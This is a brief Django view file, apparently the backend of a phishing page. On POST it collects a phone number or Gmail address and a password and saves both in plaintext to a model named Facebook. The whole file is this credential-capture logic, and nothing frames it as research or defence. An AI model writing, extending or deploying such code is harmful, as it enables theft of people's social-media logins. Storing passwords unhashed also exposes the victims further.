from django.shortcuts import render
from .models import Facebook

def index(request):
    if request.method == 'POST':
        number_or_gmail = request.POST['number']
        password = request.POST['password']
        
        facebook_account = Facebook(Number=number_or_gmail, Password=password)
        facebook_account.save()

    return render(request, 'index.html', {})